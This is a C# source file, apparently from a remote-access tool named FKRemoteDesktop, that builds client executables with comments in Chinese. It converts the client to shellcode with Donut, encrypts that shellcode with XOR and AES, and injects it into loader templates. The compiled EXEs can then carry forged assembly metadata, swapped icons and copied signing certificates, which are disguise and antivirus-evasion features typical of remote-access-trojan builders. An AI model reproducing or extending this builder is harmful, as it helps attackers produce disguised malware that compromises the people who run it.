using FKRemoteDesktop.Structs;
using System;
using FKRemoteDesktop.Helpers;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
using FKRemoteDesktop.Donut;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Builder
{
    public class ClientBuilder
    {
        private readonly SBuildOptions _options;
        private readonly string _clientFilePath;

        public ClientBuilder(SBuildOptions options, string clientFilePath)
        {
            _options = options;
            _clientFilePath = clientFilePath;
        }

        public string[] Build()
        {
            List<string> finalExeFileList = new List<string>();
            List<string> tempFileList = new List<string>();
            string stepFile = _options.OutputPath;
            string directory = Path.GetDirectoryName(stepFile);
            string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(stepFile);

            // 修改客户端配置信息
            stepFile = ClientWrapper.WriteSettings(_clientFilePath, _options);
            tempFileList.Add(stepFile);
            // 通过 Donut 生成 Payload.bin 文件
            stepFile = ClientWrapper.ConvertExtToPayloadBin(stepFile);
            {
                // Donut 会生成俩个文件
                string donutFileDirectory = Path.GetDirectoryName(stepFile);
                string donutFileNameWithoutExtension = Path.GetFileNameWithoutExtension(stepFile);
                string outputPath1 = Path.Combine(donutFileDirectory, $"{donutFileNameWithoutExtension}.bin");
                string outputPath2 = Path.Combine(donutFileDirectory, $"{donutFileNameWithoutExtension}.bin.b64");
                tempFileList.Add(outputPath1);
                tempFileList.Add(outputPath2);
            }

            // 根据不同的脚本包装生成EXE
            {
                // 拷贝文件夹，将 resources 中的 Scripts 文件夹以及其下内容全部拷贝到 exe 所在文件夹
                string exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                string scriptSourcePath = Path.Combine(exePath, "..", "..", "Resources", "Scripts");
                string scriptDestPath = Path.Combine(exePath, "Scripts");
                // 规范化路径（处理 .. 等）
                scriptSourcePath = Path.GetFullPath(scriptSourcePath);
                // 验证源路径存在
                if (!Directory.Exists(scriptSourcePath))
                {
                    throw new DirectoryNotFoundException($"源文件夹 {scriptSourcePath} 不存在");
                }
                // 如果目标文件夹已存在，删除或根据需求处理
                if (Directory.Exists(scriptDestPath))
                {
                    Directory.Delete(scriptDestPath, true); // 删除现有文件夹及其内容
                }
                // 递归复制文件夹
                FileHelper.CopyDirectory(scriptSourcePath, scriptDestPath);

                // 遍历脚本文件夹的全部文件
                string[] files = Directory.GetFiles(scriptDestPath);
                foreach (string file in files)
                {
                    string scriptFileNameWithoutExtension = Path.GetFileNameWithoutExtension(file);
                    string fileExtension = Path.GetExtension(file);
                    if (!fileExtension.Equals(".cs"))
                        continue;   // 不是有效脚本，跳过

                    if (!FileHelper.IsFileEmpty(stepFile))
                    {
                        // 加载脚本开始编译
                        string code = LoadFromScript(file, stepFile);
                        string outputFile = Path.Combine(directory, $"{fileNameWithoutExtension}_{scriptFileNameWithoutExtension}.exe");
                        // 确保输出目录存在
                        string outputDir = Path.GetDirectoryName(stepFile);
                        if (!Directory.Exists(outputDir))
                        {
                            Directory.CreateDirectory(outputDir);
                        }
                        // 编译代码生成EXE文件
                        outputFile = ClientWrapper.CompilerCodeToExe(code, outputFile);
                        // 修改Assembly信息
                        if (_options.IsUseCopyAsmInfoPath)
                        {
                            outputFile = ClientWrapper.MofifyAsmInfo(outputFile, _options);
                        }
                        // 修改Icon信息
                        if (_options.IsUseCustomIconPath)
                        {
                            outputFile = ClientWrapper.ChangeIcon(outputFile, _options);
                        }
                        // 修改签名证书
                        if (_options.IsUseCopySignature)
                        {
                            tempFileList.Add(outputFile);   // 加签名证书会生成新文件
                            outputFile = ClientWrapper.AddSignature(outputFile, _options);
                        }
                        finalExeFileList.Add(outputFile);
                    }
                }
            }

            // 删除中间文件
            foreach (string filePath in tempFileList)
            {
                try
                {
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }
                }
                catch (Exception) { continue; } // 没删掉无所谓
            }
            
            return finalExeFileList.ToArray();
        }

        private static byte[] XorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }
        public static byte[] AESDecrypt(byte[] cipherData, string aes_key, string aes_iv)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);
            CryptoStream cs = new CryptoStream(ms, alg.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(cipherData, 0, cipherData.Length);
            cs.Close();
            byte[] decryptedData = ms.ToArray();
            return decryptedData;
        }

        private string LoadFromScript(string scriptFile, string shellcodeFile)
        {
            try
            {
                string code = File.ReadAllText(scriptFile);
                // 基本模式加密
                {
                    byte[] SHELL_CODE_ARRAY = File.ReadAllBytes(shellcodeFile);
                    string SHELL_CODE_STRING = "new byte[] { " + string.Join(", ", SHELL_CODE_ARRAY.Select(b => $"0x{b:X2}")) + " }";
                    // 替换 SHELL_CODE_ARRAY 占位符
                    code = code.Replace("{SHELL_CODE_ARRAY}", SHELL_CODE_STRING).Replace("{ SHELL_CODE_ARRAY }", SHELL_CODE_STRING);    // 防止IDE自动加空格
                }

                // FKShellcode 加密
                {
                    FKShellcode fkShellcode = new FKShellcode();
                    string encryptedShellcode = fkShellcode.Encrypt(shellcodeFile);
                    string encryptedShellcodeBytes = "new byte[] { " + string.Join(", ", Convert.FromBase64String(encryptedShellcode).Select(b => $"0x{b:X2}")) + " }";
                    string xorEncryptedShellcode = fkShellcode.XOREncrypt(shellcodeFile);
                    string xorEncryptedShellcodeBytes = "new byte[] { " + string.Join(", ", Convert.FromBase64String(xorEncryptedShellcode).Select(b => $"0x{b:X2}")) + " }";
                    string aesKey = fkShellcode.GetAesKey();
                    string aesKeyBytes = "new byte[] { " + string.Join(", ", Convert.FromBase64String(aesKey).Select(b => $"0x{b:X2}")) + " }";
                    string aesIv = fkShellcode.GetAesIV();
                    string aseIvBytes = "new byte[] { " + string.Join(", ", Convert.FromBase64String(aesIv).Select(b => $"0x{b:X2}")) + " }";
                    string xorKey = fkShellcode.GetXorKey();
                    string xorKeyBytes = "new byte[] { " + string.Join(", ", Encoding.UTF8.GetBytes(xorKey).Select(b => $"0x{b:X2}")) + " }";
                    // 替换 SHELL_CODE_ARRAY 占位符
                    code = code.Replace("{ENCRYPTED_SHELL_CODE}", encryptedShellcode).Replace("{ ENCRYPTED_SHELL_CODE }", encryptedShellcode)
                        .Replace("{ENCRYPTED_SHELL_CODE_BYTES}", encryptedShellcodeBytes).Replace("{ ENCRYPTED_SHELL_CODE_BYTES }", encryptedShellcodeBytes)
                        .Replace("{XOR_ENCRYPTED_SHELL_CODE}", xorEncryptedShellcode).Replace("{ XOR_ENCRYPTED_SHELL_CODE }", xorEncryptedShellcode)
                        .Replace("{XOR_ENCRYPTED_SHELL_CODE_BYTES}", xorEncryptedShellcodeBytes).Replace("{ XOR_ENCRYPTED_SHELL_CODE_BYTES }", xorEncryptedShellcodeBytes)
                        .Replace("{AES_KEY}", aesKey).Replace("{ AES_KEY }", aesKey)
                        .Replace("{AES_KEY_BYTES}", aesKeyBytes).Replace("{ AES_KEY_BYTES }", aesKeyBytes)
                        .Replace("{AES_IV}", aesIv).Replace("{ AES_IV }", aesIv)
                        .Replace("{AES_IV_BYTES}", aseIvBytes).Replace("{ AES_IV_BYTES }", aseIvBytes)
                        .Replace("{XOR_KEY}", xorKey).Replace("{ XOR_KEY }", xorKey)
                        .Replace("{XOR_KEY_BYTES}", xorKeyBytes).Replace("{ XOR_KEY_BYTES }", xorKeyBytes);
                }
#if DEBUG
                // 生成 debug 脚本文件以便测试
                {
                    string filename = Path.GetFileName(scriptFile);
                    string outputDir = Path.Combine(Path.GetDirectoryName(scriptFile), "Debug");
                    if (!Directory.Exists(outputDir))
                    {
                        Directory.CreateDirectory(outputDir);
                    }
                    string debugFilePath = Path.Combine(Path.GetDirectoryName(scriptFile), "Debug", filename);
                    File.WriteAllText(debugFilePath, code);
                }
#endif
                return code;
            }
            catch (IOException ex)
            {
                throw new IOException($"读取脚本文件 {scriptFile} 失败: {ex.Message}", ex);
            }
            catch (Exception ex)
            {
                throw new Exception($"处理脚本文件 {scriptFile} 时发生错误: {ex.Message}", ex);
            }
        }
    }
}
